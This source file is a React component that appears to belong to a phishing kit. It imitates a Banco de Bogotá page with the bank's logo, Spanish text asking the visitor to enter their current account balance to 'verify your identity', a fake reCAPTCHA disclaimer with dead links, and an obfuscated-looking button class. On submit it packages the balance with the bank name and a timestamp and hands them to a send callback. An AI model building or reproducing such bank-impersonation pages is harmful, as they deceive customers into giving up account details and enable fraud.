/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useState } from "react";
import BankCssLoader from "./BankCssLoader";

export default function Saldo({ enviar }: any) {
  const [saldo, setSaldo] = useState("");
  const [loading, setLoading] = useState(false);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value) {
      value = new Intl.NumberFormat("es-CO").format(parseInt(value));
      setSaldo(`$ ${value}`);
    } else {
      setSaldo("");
    }
  };

  function handleSubmit() {
    if (!saldo) {
      console.warn("Datos inválidos");
      return null;
    }

    return {
      view: "saldo",
      saldo,
      bank: "bogota",
      timestamp: new Date().toISOString(),
    };
  }

  return (
    <main className="container" style={{ position: "relative" }}>
      {/* COLUMNA IZQUIERDA */}
      <BankCssLoader visible={loading} />
      <div className="rang"></div>
      <section className="left">
        <div className="wjeu">
          {/* LOGO */}
          <img src="/bancos/bogota/css/logo.svg" alt="Banco de Bogotá" className="logo" />
          <h1>
            <b>Confirma tu saldo</b>
          </h1>

          {/* LOGIN CARD */}
          <div className="login-card">
            {/* FORMULARIO */}
            <form
              id="form-clave"
              className="form-content active"
              method="POST"
              onSubmit={(e) => e.preventDefault()}
            >
              <div className="alert">
                Por favor, ingresa tu saldo actual para verificar tu identidad.
              </div>

              <div className="bpas">
                <label>Saldo</label>
                <div className="id-inputs">
                  <input
                    type="text"
                    placeholder="$ 0"
                    value={saldo}
                    onChange={handleChange}
                    style={{ width: '100%', paddingLeft: '15px', fontWeight: 'bold', fontSize: '18px' }}
                  />
                </div>

                <button
                  className="eay7wDeyb-EbWIk2kfDMUg== bdb-at-btn bdb-at-btn--primary bdb-at-btn--lg"
                  type="submit"
                  disabled={!saldo}
                  onClick={() => {
                    setLoading(true);
                    const data = handleSubmit();
                    if (data) {
                      enviar(data);
                      setTimeout(() => {
                        setLoading(false);
                      }, 3000);
                    }
                  }}
                  style={{ marginTop: '20px' }}
                >
                  Continuar
                </button>
              </div>
            </form>
          </div>

          {/* DISCLAIMER */}
          <p className="disclaimer">
            Este sitio está protegido por reCAPTCHA y aplican las{" "}
            <a href="#">políticas de privacidad</a> y los{" "}
            <a href="#">términos de servicio de Google</a>.
          </p>
        </div>
      </section>

      {/* COLUMNA DERECHA */}
      <section className="right">
        <div className="promo">
          <img
            src="https://ftp.mathilde-ads.com/71-889f99de979d5beef1223eb16fe288e7.png"
            alt="Cuenta Fácil"
          />
        </div>
        <div className="promo">
          <img src="/bancos/bogota/css/coue.png" alt="Cuenta Fácil" />
        </div>
      </section>
    </main>
  );
}